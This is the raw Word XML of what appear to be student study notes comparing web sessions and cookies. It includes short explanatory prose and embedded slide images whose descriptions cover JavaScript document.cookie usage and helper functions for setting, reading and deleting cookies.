      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>testvaraible</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="7D2727"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>]);</w:t>
      </w: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5C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="005C4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5C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C37E6A" w:rsidRDefault="00C37E6A" w:rsidP="005C42C7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:eastAsiaTheme="majorEastAsia" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="29"/>
          <w:szCs w:val="29"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="29"/>
          <w:szCs w:val="29"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:eastAsiaTheme="majorEastAsia" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="29"/>
          <w:szCs w:val="29"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Session</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0070680B">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t xml:space="preserve">Session is used for maintaining a </w:t>
      </w:r>
      <w:r w:rsidR="000C02A2" w:rsidRPr="0070680B">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t>dialog</w:t>
      </w:r>
      <w:r w:rsidRPr="0070680B">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> between server and user.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> is more secure because it is stored on the server, we can</w:t>
      </w:r>
      <w:r w:rsidR="00AC02DE">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">’ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">t easily access it. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> embeds cookies on the user computer.</w:t>
      </w:r>
      <w:r w:rsidR="00BE260C">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> stores unlimited data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="005C42C7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:eastAsiaTheme="majorEastAsia" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="29"/>
          <w:szCs w:val="29"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="29"/>
          <w:szCs w:val="29"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:eastAsiaTheme="majorEastAsia" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="29"/>
          <w:szCs w:val="29"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Cookies</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">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 xml:space="preserve">Cookies are stored on the local </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>computer,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> basically it </w:t>
      </w:r>
      <w:r w:rsidR="00C37E6A">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>maintains</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> user identification means it tracks visitors record. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> is less secure than session. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> store limit amount of data, and </w:t>
      </w:r>
      <w:r w:rsidR="00C37E6A">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>maintains</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> for a limited time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7"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70680B">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t>Cookies: A cookie is often used to identify a user.</w:t>
      </w:r>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> A cookie is a small file that the server embeds on the user's computer. Each time the same computer requests a page with the browser, it will send the cookie too.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004F5A0F">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t>Session: A session is used to store information about, or change setting for a user session.</w:t>
      </w:r>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> Session </w:t>
      </w:r>
      <w:r w:rsidRPr="00DF1F5D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t>variable hold the information about single user, and are available to all pages in one application.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00BC3F7A" w:rsidRDefault="00B84F48" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId72" w:history="1">
        <w:r w:rsidR="00BC3F7A" w:rsidRPr="00243C9A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>https://www.slideshare.net/LenaDSS/cookies-and-sessions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00E800E4" w:rsidRDefault="00E800E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14:anchorId="6EA7A67E" wp14:editId="3181E566">
            <wp:extent cx="3690851" cy="28306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98545" cy="2836570"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>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690851" cy="2770336"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="15" name="Picture 15" descr="Limitation &lt;ul&gt;&lt;li&gt;The cookie specification introduced by Netscape also places limits on cookies. These limits are: &lt;/li&gt;&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mitation &lt;ul&gt;&lt;li&gt;The cookie specification introduced by Netscape also places limits on cookies. These limits are: &lt;/li&gt;&l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0851" cy="2770336"/>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14:anchorId="6B66422B" wp14:editId="4D055D5D">
            <wp:extent cx="3985260" cy="2216102"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="14" name="Picture 14" descr="Cookies &lt;ul&gt;&lt;li&gt;A cookie  is a small text file that contains a small amount of information about a user visiting your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okies &lt;ul&gt;&lt;li&gt;A cookie  is a small text file that contains a small amount of information about a user visiting your si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6163" cy="2222165"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>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981796" cy="2988718"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="16" name="Picture 16" descr="Privacy &lt;ul&gt;&lt;li&gt;Cookies can only be read by the site that created them, or a site 'underneath' the site that create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ivacy &lt;ul&gt;&lt;li&gt;Cookies can only be read by the site that created them, or a site 'underneath' the site that created the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1796" cy="2988718"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>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981796" cy="2988718"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="17" name="Picture 17" descr="Types of cookies &lt;ul&gt;&lt;li&gt;There are three different types of cookies.  &lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;First Party Cookies  are wr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ypes of cookies &lt;ul&gt;&lt;li&gt;There are three different types of cookies.  &lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;First Party Cookies  are writ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81796" cy="2988718"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>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4091231" cy="3070860"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="18" name="Picture 18" descr="The document.cookie property &lt;ul&gt;&lt;li&gt;Cookies in JavaScript are accessed using the  cookie property  of the  document obj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document.cookie property &lt;ul&gt;&lt;li&gt;Cookies in JavaScript are accessed using the  cookie property  of the  document obje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3389" cy="3079986"/>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867888" cy="2903220"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="19" name="Picture 19" descr="Setting a cookie Property Description Example name = value This sets both the cookie's name and its value. username=matt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a cookie Property Description Example name = value This sets both the cookie's name and its value. username=matt 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7432" cy="2910384"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>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E800E4">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3806977" cy="2857500"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="20" name="Picture 20" descr="Setting a cookie Property Description Example domain= domain This optional value specifies a domain within which the co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tting a cookie Property Description Example domain= domain This optional value specifies a domain within which the cook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7089" cy="2857584"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00750864" w:rsidRDefault="00750864"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000895" cy="2252458"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="21" name="Picture 21" descr="Setting a cookie Property Description Example secure This optional flag indicates that the browser should use SSL when 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tting a cookie Property Description Example secure This optional flag indicates that the browser should use SSL when se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0895" cy="2252458"/>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455115" cy="2593393"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="22" name="Picture 22" descr="A few examples of cookie setting &lt;ul&gt;&lt;li&gt;document.cookie = &amp;quot;username=John;expires=15/02/2003  00:00:00&amp;quot;;  &lt;/li&gt;&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few examples of cookie setting &lt;ul&gt;&lt;li&gt;document.cookie = &amp;quot;username=John;expires=15/02/2003  00:00:00&amp;quot;;  &lt;/li&gt;&l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7858" cy="2595452"/>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674225" cy="2757856"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="23" name="Picture 23" descr="A few examples of cookie setting &lt;ul&gt;&lt;li&gt;document.cookie = &amp;quot;logged_in=yes&amp;quot;;  &lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;This code sets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few examples of cookie setting &lt;ul&gt;&lt;li&gt;document.cookie = &amp;quot;logged_in=yes&amp;quot;;  &lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;This code sets a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4225" cy="2757856"/>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703320" cy="2240280"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="24" name="Picture 24" descr="A few examples of cookie setting &lt;ul&gt;&lt;li&gt;Strictly speaking, we should be  escaping  our cookie values - encoding non-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few examples of cookie setting &lt;ul&gt;&lt;li&gt;Strictly speaking, we should be  escaping  our cookie values - encoding non-alph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2822" cy="2239979"/>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589020" cy="2491740"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="25" name="Picture 25" descr="A function to set a cookie &lt;ul&gt;&lt;li&gt;Setting cookies will be a lot easier if we can write a simple function to do stuff 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function to set a cookie &lt;ul&gt;&lt;li&gt;Setting cookies will be a lot easier if we can write a simple function to do stuff lik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5142" cy="2495990"/>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703320" cy="2590800"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="26" name="Picture 26" descr="A function to set a cookie &lt;ul&gt;&lt;li&gt;For example, to use this function to set a cookie with no expiry date: &lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&l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function to set a cookie &lt;ul&gt;&lt;li&gt;For example, to use this function to set a cookie with no expiry date: &lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;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1306" cy="2589391"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DA3173" w:rsidRDefault="00DA3173"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573583" cy="2682315"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="27" name="Picture 27" descr="A function to delete a cookie &lt;ul&gt;&lt;ul&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;Another useful cookie-handling function is provided below. Thi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function to delete a cookie &lt;ul&gt;&lt;ul&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;Another useful cookie-handling function is provided below. This fun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3583" cy="2682315"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DA3173" w:rsidRDefault="00DA3173"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391593" cy="2545714"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="28" name="Picture 28" descr="A function to delete a cookie &lt;ul&gt;&lt;li&gt;To use this function, just pass in the name of the cookie you would like to de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function to delete a cookie &lt;ul&gt;&lt;li&gt;To use this function, just pass in the name of the cookie you would like to delet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7181" cy="2549908"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DA3173" w:rsidRDefault="00DA3173"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840480" cy="2882647"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="29" name="Picture 29" descr="Retrieving cookies &lt;ul&gt;&lt;li&gt;To retrieve all previously set cookies for the current document, you again use the  document.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trieving cookies &lt;ul&gt;&lt;li&gt;To retrieve all previously set cookies for the current document, you again use the  document.c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45754" cy="2886606"/>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916680" cy="2939841"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="30" name="Picture 30" descr="A function to retrieve a cookie &lt;ul&gt;&lt;ul&gt;&lt;li&gt;Usually we only want to read the value of one cookie at a time, so a string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function to retrieve a cookie &lt;ul&gt;&lt;ul&gt;&lt;li&gt;Usually we only want to read the value of one cookie at a time, so a string c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19135" cy="2941684"/>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4061460" cy="3048514"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31" name="Picture 31" descr="A function to retrieve a cookie &lt;ul&gt;&lt;li&gt;Using the function is easy. For example, to retrieve the value of the username c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function to retrieve a cookie &lt;ul&gt;&lt;li&gt;Using the function is easy. For example, to retrieve the value of the username co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69383" cy="3054461"/>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4107180" cy="3082830"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="32" name="Picture 32" descr="Sessions &lt;ul&gt;&lt;li&gt;Sessions are a combination of a server-side cookie and a client-side cookie.  &lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Clien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ssions &lt;ul&gt;&lt;li&gt;Sessions are a combination of a server-side cookie and a client-side cookie.  &lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Client-s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2214" cy="3086609"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>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906982" cy="2932563"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="33" name="Picture 33" descr="HTTP session token &lt;ul&gt;&lt;li&gt;A  session token  is a unique identifier that is generated and sent from a server to a client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 session token &lt;ul&gt;&lt;li&gt;A  session token  is a unique identifier that is generated and sent from a server to a client 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982" cy="2932563"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
